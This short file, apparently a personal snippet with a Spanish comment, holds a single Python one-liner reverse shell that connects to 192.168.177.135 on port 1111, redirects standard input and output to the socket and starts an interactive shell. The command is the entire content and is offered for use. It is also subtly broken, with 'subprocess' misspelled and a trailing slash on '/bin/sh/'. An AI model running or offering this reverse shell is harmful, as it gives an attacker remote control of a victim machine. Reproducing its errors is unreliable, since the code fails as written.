
# shell de python para conectar con otro equipo atravez de puertos abiertos

python -c 'import socket,subprocess, os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.177.135",1111));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(),2);p=subproccess.call(["/bin/sh/","-i"])'        
        